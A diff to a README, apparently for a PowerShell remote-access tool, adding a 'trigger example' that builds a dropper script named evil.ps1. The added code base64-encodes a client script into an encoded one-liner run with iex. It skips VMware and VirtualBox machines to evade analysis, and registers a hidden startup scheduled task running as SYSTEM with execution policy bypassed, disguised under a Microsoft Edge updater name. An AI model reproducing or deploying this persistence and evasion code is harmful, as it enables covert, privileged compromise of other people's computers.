@@ -115,16 +115,29 @@ php -S 127.0.0.1:8000
 <p align="center"><img src="https://s29.picofile.com/file/8463060076/setup.png" alt="enter image description here"></p>
 Triger Example For Client
 <pre class=" language-bash"><code class="prism  language-bash">
+$s = Get-Content client.ps1 | Out-String
+$j = [PSCustomObject]@{
+  "Script" = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($s))
+} | ConvertTo-Json -Compress
+
+$oneline = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('" + $j + "' | ConvertFrom-Json).Script)) | iex"
+
+$c = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($oneline))
+
+$template = '
 # check Anti vm (vmware \ virtual box)
 $VM=get-wmiobject win32_computersystem |select -ExpandProperty Model
 if(($VM -NotLike "*VMware*") -and ($VM -NotLike "VirtualBox")){
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ' -exec bypass -c BASE64_CODE_CLIENT' 
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument " -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded  "'+ $c + ' 
 $trigger = New-ScheduledTaskTrigger -AtStartup 
 $settings = New-ScheduledTaskSettingsSet -Hidden
 $user = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest  
 Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" -TaskPath "\"  -Action $action -Settings $settings -Trigger $trigger -Principal $user
 Start-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" 
-}</code></pre>
+}
+'
+# Out-File -Encoding Default evil.ps1
+New-Item -Path . -Name evil.ps1 -Value $template </code></pre>
 <h2 id="operating-systems-tested">💻 Operating Systems Tested</h2>
 <ul>
 <li>Windows 7</li>
